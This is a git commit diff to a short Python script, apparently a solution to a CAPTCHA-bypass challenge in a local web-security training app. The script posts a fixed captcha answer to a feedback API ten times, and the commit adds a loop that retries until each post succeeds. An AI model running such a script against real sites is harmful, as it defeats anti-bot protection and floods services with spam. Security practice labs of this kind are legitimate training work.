3d5b8a68a03692f48e80ee8700f1cbd720052efc
Pauxy <chunyu1399@outlook.com>
2021-11-12 00:59:07 +0800

    feat(CAPTCHA_Bypass): added checking for if requests actually goes thru
    Signed-off-by: Pauxy <chunyu1399@outlook.com>

--- CAPTCHA_Bypass/solve.py
+++ CAPTCHA_Bypass/solve.py
@@ -4,7 +4,10 @@ myobj={"UserId":2,"captchaId":1,"captcha":"-20","comment":"site heheheheh (***@j
 url = "http://127.0.0.1:3000/api/Feedbacks/"
 
 for i in range(10):
-    x = requests.post(url, data = myobj)
+    status = 0
+    while status!=201:
+        x = requests.post(url, data = myobj)
+        status = x.status_code
     print(f"Sent {i} requests",end = "\r")
 print("Sent 10 requests\nChallenge completed")
 
